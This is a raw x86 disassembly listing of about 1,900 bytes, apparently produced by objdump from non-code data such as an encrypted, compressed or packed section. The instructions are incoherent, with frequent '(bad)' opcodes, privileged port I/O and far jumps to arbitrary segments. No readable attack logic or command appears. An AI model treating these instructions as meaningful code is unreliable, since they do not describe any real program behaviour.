  4187c4:	mov    ds:0xdef6d308,al
  4187c9:	or     BYTE PTR [eax+edx*4-0x6a],0xbb
  4187ce:	dec    eax
  4187cf:	aad    0xc8
  4187d1:	aad    0x90
  4187d3:	loop   0x4187f1
  4187d5:	stos   DWORD PTR es:[edi],eax
  4187d6:	jmp    0x4187c9
  4187d8:	xchg   esi,eax
  4187d9:	push   cs
  4187da:	or     ecx,DWORD PTR [ebp-0x6f]
  4187dd:	call   ebp
  4187df:	gs std 
  4187e1:	cli    
  4187e2:	je     0x4187f0
  4187e4:	lahf   
  4187e5:	push   ebp
  4187e6:	dec    ebx
  4187e7:	cmp    BYTE PTR [ebx],dh
  4187e9:	std    
  4187ea:	loope  0x418800
  4187ec:	mov    esi,0xf84bd383
  4187f1:	fcomi  st,st(6)
  4187f3:	in     eax,0xbe
  4187f5:	mov    eax,0x881e43c1
  4187fa:	and    eax,0xe67b569c
  4187ff:	shl    DWORD PTR ds:0x6a01394f,cl
  418805:	ret    
  418806:	push   ss
  418807:	push   0x90877d53
  41880c:	shl    BYTE PTR [eax+ecx*1-0x379f4e78],1
  418813:	add    esp,DWORD PTR ds:0x766f9f62
  418819:	inc    ebp
  41881a:	lds    edx,FWORD PTR [ecx+0x74]
  41881d:	add    al,0xc7
  41881f:	ror    al,1
  418821:	or     esp,0xffffffd3
  418824:	clc    
  418825:	add    DWORD PTR [ebp-0x48e2963b],ebp
  41882b:	ins    BYTE PTR es:[edi],dx
  41882c:	push   esp
  41882d:	push   eax
  41882e:	mov    bh,0x6
  418830:	iret   
  418831:	call   0x6c28:0x6f4a5f4d
  418838:	pop    ds
  418839:	jns    0x41885a
  41883b:	stc    
  41883c:	cmp    eax,0xb7ec50c1
  418841:	daa    
  418842:	stos   BYTE PTR es:[edi],al
  418843:	pushf  
  418844:	je     0x4188ae
  418846:	sbb    BYTE PTR [edi],bh
  418848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418849:	loopne 0x418804
  41884b:	aam    0xe4
  41884d:	repz sti 
  41884f:	pop    es
  418850:	push   esi
  418851:	xor    ecx,DWORD PTR [edx-0x47743cf1]
  418857:	out    dx,eax
  418858:	scas   eax,DWORD PTR es:[edi]
  418859:	shl    edx,cl
  41885b:	mov    edi,0xc426534b
  418860:	shr    BYTE PTR [ebx],cl
  418862:	pop    ecx
  418863:	sbb    eax,0x793313ba
  418868:	xor    eax,0xcf39bff7
  41886d:	pop    esp
  41886e:	sbb    DWORD PTR [edx+0x7a],esp
  418871:	arpl   WORD PTR [ebx-0x5f9950f2],bx
  418877:	jnp    0x41889c
  418879:	jl     0x418806
  41887b:	adc    edi,DWORD PTR [edi+eax*1]
  41887e:	aaa    
  41887f:	jnp    0x418878
  418881:	aad    0x78
  418883:	les    edi,FWORD PTR [eax+0x31]
  418886:	push   cs
  418887:	mov    edi,0xf239c385
  41888c:	jno    0x41884a
  41888e:	mov    ds:0x7aff4286,eax
  418893:	retf   
  418894:	lock sub al,0xfc
  418897:	loop   0x418904
  418899:	sar    BYTE PTR [edx-0x4b75cd11],1
  41889f:	jle    0x4188f9
  4188a1:	in     eax,0xad
  4188a3:	loopne 0x4188a5
  4188a5:	mov    al,0x56
  4188a7:	adc    bh,BYTE PTR [esi]
  4188a9:	fcomp  st(7)
  4188ab:	adc    ah,0xa1
  4188ae:	jmp    0xaa78:0xffec0be0
  4188b5:	icebp  
  4188b6:	mov    al,0xf
  4188b8:	pop    esp
  4188b9:	xor    ecx,DWORD PTR [esi+0x22699e43]
  4188bf:	sbb    ecx,DWORD PTR [ecx+ebx*1-0x64d08ea5]
  4188c6:	sbb    cl,al
  4188c8:	cld    
  4188c9:	sub    eax,0xbd18e2c
  4188ce:	ja     0x418870
  4188d0:	ret    0x2c2d
  4188d3:	clc    
  4188d4:	pop    ds
  4188d5:	ret    
  4188d6:	sahf   
  4188d7:	cwde   
  4188d8:	out    dx,al
  4188d9:	les    esp,FWORD PTR [ecx-0x283aa465]
  4188df:	xor    dh,BYTE PTR [ecx-0x59b6dcc9]
  4188e5:	xchg   edx,eax
  4188e6:	bswap  eax
  4188e8:	or     al,0xa8
  4188ea:	sub    al,0x79
  4188ec:	aad    0x5f
  4188ee:	adc    ecx,DWORD PTR [edx+ebp*4-0x2c]
  4188f2:	mov    ecx,0xc95a62c3
  4188f7:	icebp  
  4188f8:	enter  0xe131,0x41
  4188fc:	leave  
  4188fd:	sbb    bh,BYTE PTR [ebx]
  4188ff:	pushf  
  418900:	mov    ah,0x67
  418902:	iret   
  418903:	cdq    
  418904:	cmp    bh,ch
  418906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418907:	add    esi,ecx
  418909:	out    dx,eax
  41890a:	popa   
  41890b:	test   cl,al
  41890d:	aad    0x36
  41890f:	fcmovnb st,st(1)
  418911:	daa    
  418912:	rcl    DWORD PTR [eax],cl
  418914:	push   esi
  418915:	mov    edx,0x687476f6
  41891a:	lahf   
  41891b:	mov    ebx,0x4f51debc
  418920:	retf   0x1e4d
  418923:	or     bl,BYTE PTR [ecx]
  418925:	dec    edi
  418926:	add    esi,DWORD PTR [esp+edx*2-0x71182aa6]
  41892d:	mov    bx,WORD PTR [eax]
  418930:	adc    eax,0x7e3a24e6
  418935:	push   esi
  418936:	jns    0x4189a5
  418938:	sti    
  418939:	arpl   WORD PTR [esi+ebp*1-0x31],si
  41893d:	iret   
  41893e:	mov    al,0x1e
  418940:	or     al,0xf3
  418942:	in     eax,dx
  418943:	xchg   edx,eax
  418944:	test   BYTE PTR [esi],cl
  418946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418947:	xchg   ecx,eax
  418948:	jmp    0xe148:0xa5a76c7b
  41894f:	ds (bad) 
  418951:	and    eax,0x18b80d4a
  418956:	sbb    eax,0x30bf0f80
  41895b:	or     eax,0xa9f5acaa
  418960:	dec    edi
  418961:	(bad)  
  418962:	lock dec ecx
  418964:	cld    
  418965:	xchg   edi,eax
  418966:	push   edx
  418967:	mov    bl,0xbd
  418969:	(bad)  
  41896a:	mov    dl,0xba
  41896c:	mov    al,ds:0xf4fe7213
  418971:	cmp    ecx,DWORD PTR [ecx+0xc]
  418974:	stc    
  418975:	rcl    BYTE PTR [edx],0x12
  418978:	mov    ebp,0x2e9aa102
  41897d:	and    DWORD PTR [ecx+0x6aa269ed],edx
  418983:	push   ss
  418984:	sbb    BYTE PTR [esi],bh
  418986:	(bad)  
  418987:	sbb    BYTE PTR [ebx],al
  418989:	mov    edi,gs
  41898b:	test   al,0x90
  41898d:	or     DWORD PTR [esi+edx*4],ebp
  418990:	stos   DWORD PTR es:[edi],eax
  418991:	out    dx,eax
  418992:	and    BYTE PTR [edx-0x27],cl
  418995:	jbe    0x418972
  418997:	add    edx,DWORD PTR ds:0xadff7911
  41899d:	dec    esp
  41899e:	in     eax,0xa7
  4189a0:	mov    ecx,0xfc2e9c3d
  4189a5:	shl    DWORD PTR [ecx-0x67],1
  4189a8:	cld    
  4189a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189aa:	(bad)  
  4189ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189ad:	retf   0x76f7
  4189b0:	jle    0x418936
  4189b2:	ror    BYTE PTR [edi+edi*1+0x64d2cf4b],0xf3
  4189ba:	xchg   esi,eax
  4189bb:	jmp    0xcce4c2c0
  4189c0:	hlt    
  4189c1:	je     0x418969
  4189c3:	int3   
  4189c4:	shl    ah,0xc4
  4189c7:	in     al,dx
  4189c8:	ror    DWORD PTR [ebx+0xd0144bb],cl
  4189ce:	inc    edx
  4189cf:	(bad)  
  4189d0:	adc    bl,BYTE PTR [eax-0xe]
  4189d3:	mov    al,ds:0xa836032
  4189d8:	sbb    BYTE PTR [ebp+0x1c6ee413],ah
  4189de:	ins    DWORD PTR es:[edi],dx
  4189df:	fbld   TBYTE PTR [esi-0x782ff61]
  4189e5:	ja     0x4189c6
  4189e7:	into   
  4189e8:	add    esi,ebx
  4189ea:	or     eax,0xda0c938a
  4189ef:	cmp    al,0x4e
  4189f1:	xchg   BYTE PTR [ecx-0x5f],al
  4189f4:	or     eax,0xe2b2ebe8
  4189f9:	adc    dl,ch
  4189fb:	pushf  
  4189fc:	test   al,0xe4
  4189fe:	nop
  4189ff:	or     eax,0xa93d5cea
  418a04:	test   DWORD PTR [ebp+eax*4-0x6113c109],0x71b05a16
  418a0f:	fadd   DWORD PTR [eax-0xf73fb67]
  418a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a16:	lahf   
  418a17:	daa    
  418a18:	daa    
  418a19:	and    BYTE PTR [esi-0x2e],cl
  418a1c:	mov    ah,0x92
  418a1e:	adc    DWORD PTR [edi],ecx
  418a20:	push   ecx
  418a21:	push   edx
  418a22:	and    DWORD PTR [ecx],esi
  418a24:	test   eax,0xb34f9a32
  418a29:	push   ebx
  418a2a:	mov    dl,BYTE PTR [ebp+0x5c]
  418a2d:	daa    
  418a2e:	scas   al,BYTE PTR es:[edi]
  418a2f:	inc    eax
  418a30:	out    dx,eax
  418a31:	(bad)  
  418a32:	inc    ebx
  418a33:	mov    ch,0xaa
  418a35:	inc    ebp
  418a36:	mov    ebp,0x8ea8e529
  418a3b:	(bad)  
  418a3c:	and    al,0xa7
  418a3e:	dec    esi
  418a3f:	or     al,0x4
  418a41:	push   esi
  418a42:	ins    BYTE PTR es:[edi],dx
  418a43:	scas   eax,DWORD PTR es:[edi]
  418a44:	xchg   edi,eax
  418a45:	rcl    DWORD PTR [edi+0x2951ae48],cl
  418a4b:	ret    0xcb1d
  418a4e:	iret   
  418a4f:	fdiv   DWORD PTR [edi+eiz*2-0x37]
  418a53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a54:	sub    eax,0x99bf5475
  418a59:	(bad)  [ebx+edx*4-0x48]
  418a5d:	shl    DWORD PTR [edi],1
  418a5f:	dec    esp
  418a60:	inc    eax
  418a61:	and    al,BYTE PTR [edi]
  418a63:	inc    esp
  418a64:	sub    eax,0xbd76db4d
  418a69:	jecxz  0x418a46
  418a6b:	repnz mov ebx,0x25f6a2de
  418a71:	inc    ebp
  418a72:	jge    0x418aaa
  418a74:	leave  
  418a75:	loop   0x418af1
  418a77:	repnz add BYTE PTR [ecx+0x6d7cf575],0x4
  418a7f:	fcom   QWORD PTR [ebp+ebp*1+0x16]
  418a83:	loop   0x418aca
  418a85:	jbe    0x418a1e
  418a87:	xchg   esp,eax
  418a88:	mov    eax,ds:0xe513b0fc
  418a8d:	pop    es
  418a8e:	idiv   DWORD PTR es:[esi+0x7856e5e7]
  418a95:	retf   
  418a96:	gs sbb eax,0x439cbf21
  418a9c:	pop    ds
  418a9d:	adc    edx,DWORD PTR [ecx]
  418a9f:	inc    esp
  418aa0:	inc    ecx
  418aa1:	dec    ebp
  418aa2:	or     BYTE PTR [si],cl
  418aa5:	fnstsw WORD PTR [eax+0x7e10d434]
  418aab:	jbe    0x418a76
  418aad:	dec    esi
  418aae:	in     al,dx
  418aaf:	call   0x9ffe55ae
  418ab4:	mov    al,0xd2
  418ab6:	or     ebp,DWORD PTR [esi+esi*4-0x31]
  418aba:	jns    0x418a8c
  418abc:	icebp  
  418abd:	addr16 adc al,0xc1
  418ac0:	inc    eax
  418ac1:	mov    bh,0x48
  418ac3:	xchg   edi,eax
  418ac4:	jae    0x418a96
  418ac6:	jp     0x418b47
  418ac8:	gs jmp 0x418b10
  418acb:	push   es
  418acc:	jo     0x418a66
  418ace:	aas    
  418acf:	xor    DWORD PTR [ecx+0x29],esi
  418ad2:	cmp    ebp,DWORD PTR [ecx]
  418ad4:	lea    ebx,ds:0xf6bd6bad
  418ada:	cld    
  418adb:	jl     0x418ad4
  418add:	nop
  418ade:	xchg   esp,eax
  418adf:	fistp  QWORD PTR [esp+edx*2]
  418ae2:	and    BYTE PTR [ecx-0x3d],cl
  418ae5:	es (bad) 
  418ae7:	aad    0x2a
  418ae9:	push   ebp
  418aea:	xor    eax,0x33e402b3
  418aef:	xor    eax,0x7184d77f
  418af4:	xor    al,0x5
  418af6:	jnp    0x418a95
  418af8:	jmp    0x367ef3a0
  418afd:	cmp    dh,BYTE PTR [ecx-0x6a48c220]
  418b03:	sahf   
  418b04:	xor    DWORD PTR [edi+0x34620b1b],ecx
  418b0a:	or     eax,0x1765eabf
  418b0f:	js     0x418b4f
  418b11:	jp     0x418aea
  418b13:	mov    eax,0x205873a8
  418b18:	cmp    eax,0x53d4dab9
  418b1d:	adc    BYTE PTR [eax-0x5d743e6c],ah
  418b23:	shl    edx,cl
  418b25:	cmp    bh,BYTE PTR [edx+0xe25d212]
  418b2b:	das    
  418b2c:	mov    ds:0xb483e485,al
  418b31:	push   ss
  418b32:	pusha  
  418b33:	add    DWORD PTR [ebx+esi*1],ebp
  418b36:	call   0xec3a:0x58ba4064
  418b3d:	mov    DWORD PTR [edx-0x4d0a7fb4],esp
  418b43:	lods   eax,DWORD PTR ds:[esi]
  418b44:	sub    DWORD PTR [edx],eax
  418b46:	stos   BYTE PTR es:[edi],al
  418b47:	retf   
  418b48:	(bad)  
  418b4a:	scas   eax,DWORD PTR es:[edi]
  418b4b:	stc    
  418b4c:	ins    DWORD PTR es:[edi],dx
  418b4d:	cmp    dh,BYTE PTR [esi]
  418b4f:	ins    DWORD PTR es:[edi],dx
  418b50:	mov    cl,0x43
  418b52:	lods   al,BYTE PTR ds:[esi]
  418b53:	pop    DWORD PTR [edx+0x1d2f8c98]
  418b59:	add    esi,ecx
  418b5b:	(bad)  
  418b5c:	popa   
  418b5d:	jle    0x418b92
  418b5f:	sbb    dh,dh
  418b61:	mov    esp,0x1fbcdda1
  418b66:	lea    ebx,[ebp+0x13364eda]
  418b6c:	les    ebx,FWORD PTR [esi]
  418b6e:	mov    esp,0xc05c06c
  418b73:	hlt    
  418b74:	lds    ecx,FWORD PTR [edi+0x3824cc56]
  418b7a:	in     al,dx
  418b7b:	jbe    0x418be2
  418b7d:	out    dx,al
  418b7e:	adc    eax,0x6c2d0428
  418b83:	ror    BYTE PTR [eax+ebp*1+0x2f77da21],1
  418b8a:	std    
  418b8b:	test   eax,0xfb9058e0
  418b90:	mov    al,0xb5
  418b92:	imul   edi,ebp,0x7f
  418b95:	mov    al,ds:0x6285dd57
  418b9a:	xchg   DWORD PTR [edx],ebx
  418b9c:	stos   DWORD PTR es:[edi],eax
  418b9d:	test   BYTE PTR [ecx],cl
  418b9f:	test   eax,0x2662674f
  418ba4:	mov    bh,BYTE PTR [edi+0x72]
  418ba7:	add    DWORD PTR [ebx],0x1903bc38
  418bad:	dec    ebx
  418bae:	out    0x84,al
  418bb0:	loope  0x418c13
  418bb2:	mov    ?,WORD PTR [ecx+0x39]
  418bb5:	add    eax,0x6ae4fd13
  418bba:	pop    es
  418bbb:	je     0x418c37
  418bbd:	inc    eax
  418bbe:	xchg   ecx,eax
  418bbf:	mul    BYTE PTR [esi+0x68]
  418bc2:	test   eax,0x9f818ed9
  418bc7:	cmp    ebx,DWORD PTR [edx]
  418bc9:	fstp   DWORD PTR [ecx-0x1]
  418bcc:	shl    BYTE PTR [eax+esi*1],1
  418bcf:	push   ds
  418bd0:	stos   BYTE PTR es:[edi],al
  418bd1:	aas    
  418bd2:	jne    0x418c33
  418bd4:	xchg   esp,eax
  418bd5:	das    
  418bd6:	xor    dl,BYTE PTR [ecx+0x51]
  418bd9:	jp     0x418b7e
  418bdb:	scas   al,BYTE PTR es:[edi]
  418bdc:	fist   WORD PTR [eax]
  418bde:	xor    ebx,0x16f71228
  418be4:	xchg   edi,eax
  418be5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418be6:	mov    ebx,0x5cd3cc35
  418beb:	call   0x4cdcbf03
  418bf0:	test   BYTE PTR [esp+esi*8+0x71],bh
  418bf4:	or     edx,esi
  418bf6:	outs   dx,DWORD PTR ds:[esi]
  418bf7:	ja     0x418b8c
  418bf9:	loopne 0x418c4b
  418bfb:	jnp    0x418bcd
  418bfd:	pop    edx
  418bfe:	lods   al,BYTE PTR ds:[esi]
  418bff:	or     BYTE PTR [ebp-0x5b406e59],cl
  418c05:	mov    esi,0x1bd26952
  418c0a:	or     ebp,DWORD PTR [esi-0x19]
  418c0d:	push   eax
  418c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c0f:	add    dh,BYTE PTR [ebx+edx*4-0x18]
  418c13:	retf   
  418c14:	in     al,dx
  418c15:	sub    al,0xed
  418c17:	jge    0x418c6d
  418c19:	(bad)  
  418c1a:	mov    ebx,0xf8990383
  418c1f:	gs or  dl,dh
  418c22:	pop    es
  418c23:	sbb    eax,0x617ff511
  418c28:	sbb    edi,edi
  418c2a:	mov    esi,0x69600425
  418c2f:	sub    al,0x3d
  418c31:	mov    al,0xbf
  418c33:	push   ss
  418c34:	sub    DWORD PTR ds:0xd9252672,0x4135bdce
  418c3e:	push   ecx
  418c3f:	mov    WORD PTR [ecx],es
  418c41:	inc    esp
  418c42:	sbb    al,0x4f
  418c44:	idiv   bh
  418c46:	cmp    cl,BYTE PTR [esi-0x38a57c93]
  418c4c:	scas   eax,DWORD PTR es:[edi]
  418c4d:	data16 mov BYTE PTR [ebx-0x66],ah
  418c51:	jns    0x418c3e
  418c53:	xchg   edx,esi
  418c55:	shr    DWORD PTR [eax-0x10],1
  418c58:	or     bh,BYTE PTR [edx+0x18]
  418c5b:	push   ebp
  418c5c:	ja     0x418c0a
  418c5e:	cmp    cl,ah
  418c60:	add    edi,DWORD PTR [edx+ecx*1]
  418c63:	mov    DWORD PTR [edi],0x9b3cd676
  418c69:	push   esi
  418c6a:	test   DWORD PTR [edi+ebp*8-0x51],0x4b815843
  418c72:	mov    WORD PTR [ebp-0x8],?
  418c75:	ror    BYTE PTR [ecx-0x5c],cl
  418c78:	jo     0x418c86
  418c7a:	and    bh,BYTE PTR [esi-0x45]
  418c7d:	mov    ecx,0x82f36cc5
  418c82:	adc    ah,BYTE PTR [eax-0x31]
  418c85:	loopne 0x418c25
  418c87:	mov    esi,0x5b3f647c
  418c8c:	cmp    ebp,ebx
  418c8e:	std    
  418c8f:	hlt    
  418c90:	xchg   BYTE PTR [edi],ch
  418c92:	pop    ebp
  418c93:	arpl   WORD PTR [eax],di
  418c95:	adc    DWORD PTR [ebx-0x66aa65bd],0x29454220
  418c9f:	fiadd  DWORD PTR [edx-0x3114ebd]
  418ca5:	mov    edi,0x348ada03
  418caa:	mov    ds:0xfa081dbd,al
  418caf:	dec    BYTE PTR [ebx+0x74c2fb39]
  418cb5:	retf   0x3c63
  418cb8:	ss jmp 0x7804d16c
  418cbe:	sbb    eax,0x69ade934
  418cc3:	xlat   BYTE PTR ds:[ebx]
  418cc4:	cmp    DWORD PTR [edi],esp
  418cc6:	push   es
  418cc7:	jmp    0xb03c:0x97d60d76
  418cce:	rol    BYTE PTR [bx+di],cl
  418cd1:	or     eax,0x811e6499
  418cd6:	out    0x8c,al
  418cd8:	inc    eax
  418cd9:	jae    0x418c94
  418cdb:	call   0xd5d0:0xe6475bd7
  418ce2:	fwait
  418ce3:	cdq    
  418ce4:	or     DWORD PTR [ecx-0x40],ebp
  418ce7:	ins    DWORD PTR es:[edi],dx
  418ce8:	inc    ecx
  418ce9:	addr16 pop es
  418ceb:	xchg   ah,al
  418ced:	dec    ebx
  418cee:	push   ebp
  418cef:	retf   
  418cf0:	mov    cl,0x45
  418cf2:	dec    esp
  418cf3:	jb     0x418d2c
  418cf5:	xchg   BYTE PTR [eax+eiz*1+0x42d08aef],ch
  418cfc:	pop    ebp
  418cfd:	into   
  418cfe:	sahf   
  418cff:	in     al,dx
  418d00:	(bad)  
  418d01:	out    dx,al
  418d02:	sbb    BYTE PTR [ecx+ebx*1+0x30],bh
  418d06:	adc    al,0x8b
  418d08:	jle    0x418c9a
  418d0a:	sbb    al,0xb1
  418d0c:	test   al,0x79
  418d0e:	pop    eax
  418d0f:	sub    esi,DWORD PTR [ecx+0x50]
  418d12:	retf   
  418d13:	lds    ebx,FWORD PTR [edx+0x29143748]
  418d19:	test   BYTE PTR [edx-0x48],0xe0
  418d1d:	and    DWORD PTR [ebp-0x484e25f6],edi
  418d23:	outs   dx,DWORD PTR ds:[esi]
  418d24:	lds    esi,FWORD PTR [edx+eiz*8+0x1347d3ae]
  418d2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d2c:	retf   0xd017
  418d2f:	inc    eax
  418d30:	dec    esp
  418d31:	mov    eax,ds:0x11db64f4
  418d36:	test   al,0x89
  418d38:	xchg   edx,eax
  418d39:	jp     0x418d0a
  418d3b:	jle    0x418d4f
  418d3d:	rcl    BYTE PTR [ebp-0x2ef46af],cl
  418d43:	dec    edx
  418d44:	aaa    
  418d45:	push   ds
  418d46:	aad    0x84
  418d48:	loop   0x418ce6
  418d4a:	mul    BYTE PTR [esi+0x7aa36ae5]
  418d50:	stc    
  418d51:	sbb    BYTE PTR [edx],dh
  418d53:	adc    DWORD PTR [edx-0x3f2e7610],eax
  418d59:	push   ds
  418d5a:	or     ebx,eax
  418d5c:	xchg   edi,eax
  418d5d:	push   edx
  418d5e:	jo     0x418db4
  418d60:	cmp    al,ch
  418d62:	aad    0x36
  418d64:	push   esp
  418d65:	test   DWORD PTR [edi-0x7e],ebp
  418d68:	xor    ch,BYTE PTR [edi]
  418d6a:	fwait
  418d6b:	mov    ebp,0x54710551
  418d70:	or     bh,dl
  418d72:	mov    eax,ds:0x3437511d
  418d77:	enter  0xd2f2,0x49
  418d7b:	mov    ch,0x9
  418d7d:	call   FWORD PTR [edx]
  418d7f:	and    DWORD PTR [edi],ecx
  418d81:	int3   
  418d82:	add    BYTE PTR [edx+0x733cd056],0x69
  418d89:	pop    edx
  418d8a:	loopne 0x418d40
  418d8c:	xor    DWORD PTR [ecx+0x25],eax
  418d8f:	dec    esi
  418d90:	inc    esi
  418d91:	adc    BYTE PTR [edx-0x4],0xa1
  418d95:	call   0x38e2:0x38421d5d
  418d9c:	push   edx
  418d9d:	(bad)  
  418d9e:	sbb    edi,DWORD PTR ds:0xcb34e446
  418da4:	adc    DWORD PTR [eax],edx
  418da6:	jb     0x418d9e
  418da8:	adc    ecx,DWORD PTR [ebx-0x3b]
  418dab:	mov    ds:0xdeb9d8ac,eax
  418db0:	sbb    eax,DWORD PTR [ebx+0xcb8b0eb]
  418db6:	dec    edx
  418db7:	ret    
  418db8:	test   BYTE PTR [edi+0x61a71b82],ah
  418dbe:	and    DWORD PTR [edx],eax
  418dc0:	or     eax,0x58a296ee
  418dc5:	mov    esi,tr1
  418dc8:	cdq    
  418dc9:	les    esp,FWORD PTR [esp+eax*1+0x48e67c4b]
  418dd0:	iret   
  418dd1:	fucom  st(6)
  418dd3:	or     al,0x48
  418dd5:	xchg   ebx,eax
  418dd6:	or     DWORD PTR [eax+edx*1-0x45],0x6629f4d8
  418dde:	mov    ah,0x76
  418de0:	std    
  418de1:	je     0x418df9
  418de3:	push   ss
  418de4:	xor    edx,DWORD PTR [esi]
  418de6:	inc    edi
  418de7:	dec    esi
  418de8:	aaa    
  418de9:	je     0x418dcf
  418deb:	shl    BYTE PTR [edi+edi*2-0x610b2239],1
  418df2:	jno    0x418db6
  418df4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418df5:	test   eax,0xc805e54e
  418dfa:	xor    BYTE PTR [edi],ch
  418dfc:	mov    al,ds:0xfc52d9f3
  418e01:	leave  
  418e02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e03:	js     0x418e7d
  418e05:	fst    st(6)
  418e07:	retf   0x178d
  418e0a:	hlt    
  418e0b:	test   DWORD PTR [esi],0x1736323d
  418e11:	push   0x63
  418e13:	mov    WORD PTR [esi+esi*8],ss
  418e16:	cmp    eax,0xefa0f55b
  418e1b:	mov    ch,0xf6
  418e1d:	out    0x1,al
  418e1f:	or     eax,0x63c9c1df
  418e24:	(bad)  
  418e26:	nop
  418e27:	shl    DWORD PTR [esp+esi*8],cl
  418e2a:	gs aaa 
  418e2c:	xchg   ebp,eax
  418e2d:	sub    al,0x9a
  418e2f:	adc    bh,BYTE PTR [ebp+0x3b]
  418e32:	cld    
  418e33:	imul   esp,DWORD PTR [esi],0x74
  418e36:	hlt    
  418e37:	mov    bl,0x72
  418e39:	xor    dh,ah
  418e3b:	mov    ds:0x45ca9273,eax
  418e40:	mov    ds:0xd9b2781f,al
  418e45:	mov    bl,0x12
  418e47:	loope  0x418e27
  418e49:	imul   esi,DWORD PTR [esi-0x1640dd5c],0x7a404438
  418e53:	aas    
  418e54:	fstp   QWORD PTR fs:[ecx-0x57ba6980]
  418e5b:	rol    BYTE PTR [edx],0x4c
  418e5e:	outs   dx,BYTE PTR ds:[esi]
  418e5f:	xor    eax,0x7f425736
  418e64:	adc    eax,0x24817a6d
  418e69:	lock fild QWORD PTR [ecx]
  418e6c:	(bad)  
  418e6d:	out    dx,al
  418e6e:	pop    edx
  418e6f:	sub    edi,DWORD PTR [eax-0x1f94d5ae]
  418e75:	mov    dl,0x11
  418e77:	push   eax
  418e78:	je     0x418e48
  418e7a:	add    al,0xde
  418e7c:	shl    dl,0x8c
  418e7f:	fist   DWORD PTR [edx+ebp*1]
  418e82:	pop    esi
  418e83:	sub    BYTE PTR [esi-0x4bdb253d],0x20
  418e8a:	xchg   edx,eax
  418e8b:	call   0x2063104d
  418e90:	ins    BYTE PTR es:[edi],dx
  418e91:	inc    esp
  418e92:	pop    ds
  418e93:	adc    al,0x59
  418e95:	shl    DWORD PTR [edx+0x767430d4],0xce
  418e9c:	or     bl,bh
  418e9e:	fmul   QWORD PTR [esi-0x67a4f167]
  418ea4:	dec    esi
  418ea5:	loopne 0x418f24
  418ea7:	mov    dh,BYTE PTR [edx-0x407279bc]
  418ead:	pop    ds
  418eae:	or     eax,0xb0a676
  418eb3:	inc    ebx
  418eb4:	ins    DWORD PTR es:[edi],dx
  418eb5:	push   esp
  418eb6:	xchg   ecx,eax
  418eb7:	pop    esp
  418eb8:	fcmovu st,st(0)
  418eba:	pop    edi
  418ebb:	mov    bh,0x9f
  418ebd:	mov    dl,0xdb
  418ebf:	push   cs
  418ec0:	ret    0x38f0
  418ec3:	pop    ds
  418ec4:	inc    ebp
  418ec5:	test   DWORD PTR [edx],ebp
  418ec7:	inc    edi
  418ec8:	xchg   esp,eax
  418ec9:	scas   al,BYTE PTR es:[edi]
  418eca:	dec    ecx
  418ecb:	stc    
  418ecc:	repz test al,0x82
  418ecf:	sub    ebx,esp
  418ed1:	ins    DWORD PTR es:[edi],dx
  418ed2:	dec    esi
  418ed3:	xor    al,0x6
  418ed5:	inc    ebx
  418ed6:	and    bl,ch
  418ed8:	loope  0x418ede
  418eda:	add    DWORD PTR [ebx+0x7b],ebp
  418edd:	nop
  418ede:	in     al,0x13
  418ee0:	retf   0xfe3e
  418ee3:	ins    DWORD PTR es:[edi],dx
  418ee4:	(bad)  
  418ee5:	xchg   edx,eax
  418ee6:	jp     0x418f06
  418ee8:	lds    ecx,FWORD PTR [ecx+0x5]
  418eeb:	retf   
  418eec:	stos   DWORD PTR es:[edi],eax
  418eed:	inc    esi
  418eee:	arpl   WORD PTR ds:0x15dab5a9,bx
  418ef4:	inc    ecx
  418ef5:	push   ecx
  418ef6:	xor    BYTE PTR [edi-0x4],bh
  418ef9:	jg     0x418efa
  418efb:	hlt    
  418efc:	data16 (bad) 
  418efe:	icebp  
  418eff:	outs   dx,DWORD PTR ds:[esi]
  418f00:	cli    
  418f01:	push   ds
  418f02:	lods   eax,DWORD PTR ds:[esi]
  418f03:	outs   dx,DWORD PTR ds:[esi]
  418f04:	ud1    ebp,ebp
  418f07:	sbb    BYTE PTR [edx+0x3a],0xa6
  418f0b:	xor    al,0x32
  418f0d:	and    BYTE PTR [ebx-0x79],cl
  418f10:	mov    ebx,0x9c3f4857
  418f15:	xor    BYTE PTR [eax+0x34],al
  418f18:	out    dx,al
  418f19:	mov    cl,0x4b
  418f1b:	mov    ch,0xa9
  418f1d:	dec    esi
  418f1e:	xchg   DWORD PTR [ebp-0x54],eax
  418f21:	mov    BYTE PTR [ebp-0x5d],dl
  418f24:	or     al,0x11
  418f26:	imul   esp,ebp,0x6a
  418f29:	(bad)  
  418f2a:	adc    ebp,DWORD PTR [edx-0x6249628]
  418f30:	mov    ebx,0x8abdfaa2
  418f35:	repz cmp edx,edx
  418f38:	add    al,0x2b
  418f3a:	aam    0xba
  418f3c:	inc    edx
  418f3d:	dec    esp
  418f3e:	call   0xf657:0xc3680e4
  418f45:	fbld   TBYTE PTR [ecx+esi*1]
  418f48:	xchg   esi,eax
  418f49:	cmc    
  418f4a:	test   al,dh
  418f4c:	mov    bl,0xcc
  418f4e:	aad    0x16
  418f50:	loope  0x418f23
  418f52:	jg     0x418f5c
  418f54:	mov    dh,0x8e
  418f56:	and    BYTE PTR ds:0x375d98d9,al
  418f5c:	es cli 
  418f5e:	loopne 0x418f88
  418f60:	cmc    
  418f61:	xor    ecx,DWORD PTR [eax+0x66]
  418f64:	xchg   esp,eax
  418f65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f67:	cld    
  418f68:	gs sti 
  418f6a:	lock (bad) 
  418f6c:	icebp  
  418f6d:	dec    edx
  418f6e:	xor    ah,dh
  418f70:	ror    DWORD PTR [edx],cl
  418f72:	daa    
  418f73:	iret   
  418f74:	rcl    DWORD PTR [ebx+edi*8+0x5b],0x7f
  418f79:	push   esp
  418f7a:	add    eax,0x9d035cb2
  418f7f:	fimul  WORD PTR [esi-0x66]
  418f82:	lea    ebx,[esi-0x73]
  418f85:	mov    ebx,0x74d3ee2d
